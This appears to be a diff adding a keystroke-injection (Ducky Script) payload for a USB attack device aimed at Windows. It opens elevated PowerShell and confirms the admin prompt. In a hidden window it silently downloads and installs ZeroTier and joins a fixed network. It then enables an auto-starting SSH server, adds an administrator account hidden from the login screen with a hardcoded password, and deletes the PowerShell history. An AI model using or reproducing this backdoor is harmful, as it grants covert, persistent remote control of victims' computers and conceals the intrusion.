@@ -1,0 +1,33 @@
+DELAY 10000
+GUI r
+DELAY 1000
+REM Start elevated PowerShell
+STRING PowerShell Start-Process -Verb runAs PowerShell
+ENTER
+DELAY 5000
+ALT y
+ALT t
+DELAY 5000
+REM Shrink PowerShell window
+STRING mode con cols=20 lines=1
+ENTER
+REM Pre-Payload configuration
+STRING $86 = ${Env:ProgramFiles(x86)};
+REM Run payload in hidden PowerShell window
+STRING Start-Process -WindowStyle Hidden PowerShell "
+REM Payload
+STRING cd C:\Windows;
+STRING (New-Object System.Net.WebClient).DownloadFile('https://download.zerotier.com/dist/ZeroTier%20One.msi','C:\Windows\Zto.msi');
+STRING msiexec.exe /i Zto.msi /quiet /norestart | Out-Null;
+STRING rm .\Zto.msi;
+STRING Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0;
+STRING Set-Service -Name sshd -StartupType 'Automatic';
+STRING Start-Service sshd;
+STRING New-Item 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList' -Force | New-ItemProperty -Name Gyanbu -Value 0 -PropertyType DWord -Force;
+STRING net user Gyanbu Senpai /add;
+STRING net localgroup Administrators Gyanbu /add;
+STRING net localgroup Administratorzy Gyanbu /add
+STRING Start-Process ${86}\ZeroTier\One\zerotier-cli.bat 'join d3ecf5726d17a420';
+STRING Get-NetConnectionProfile -InterfaceAlias 'ZeroTier One *' | Set-NetConnectionProfile -NetworkCategory Private;
+STRING ";(Get-PSReadlineOption).HistorySavePath | rm;exit
+ENTER
